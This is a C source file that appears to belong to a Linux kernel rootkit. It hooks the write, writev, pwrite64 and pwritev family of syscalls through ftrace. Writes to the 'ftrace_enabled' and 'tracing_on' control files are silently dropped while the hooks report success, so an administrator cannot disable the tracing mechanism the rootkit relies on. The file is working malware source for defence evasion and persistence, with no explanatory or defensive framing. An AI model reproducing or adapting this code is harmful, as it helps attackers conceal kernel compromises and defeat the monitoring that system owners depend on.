#include "../include/core.h"
#include "../include/hooks_write.h"
#include "../ftrace/ftrace_helper.h"

#define BUF_SIZE 4096

static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                     asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                     bool compat32, bool has_offset)
{
    int fd;
    const char __user *user_buf;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd       = regs->di;
        user_buf = (const char __user *)regs->si;
        count    = regs->dx;
    } else {
        fd       = regs->bx;
        user_buf = (const char __user *)regs->cx;
        count    = regs->dx;
    }

    struct file *file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = NULL;
    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
        name = file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(file);

        char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
        if (!kernel_buf)
            return -ENOMEM;

        if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
            kfree(kernel_buf);
            return -EFAULT;
        }
        kfree(kernel_buf);

        return count;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write, false, false);
}
static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write32, true, false);
}
static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_pwrite64, false, true);
}
static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_pwrite64_ia32, true, true);
}

static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                      bool compat32)
{
    int fd;
    const struct iovec __user *vec;
    unsigned long vlen;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd   = regs->di;
        vec  = (const struct iovec __user *)regs->si;
        vlen = regs->dx;
    } else {
        fd   = regs->bx;
        vec  = (const struct iovec __user *)regs->cx;
        vlen = regs->dx;
    }

    struct file *file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = NULL;
    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
        name = file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(file);
        return vlen;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev, false);
}
static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev32, true);
}
static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev, false);
}
static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2, false);
}
static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev_ia32, true);
}
static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2_ia32, true);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write",   hooked_write,   &original_write),
    HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
    HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),

    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64),
    HOOK("__x64_sys_ia32_pwrite64", hooked_pwrite64_ia32, &original_pwrite64_ia32),

    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev),
    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
    HOOK("__ia32_sys_pwritev2", hooked_pwritev2_ia32, &original_pwritev2_ia32),
};

notrace int hooks_write_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hooks_write_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
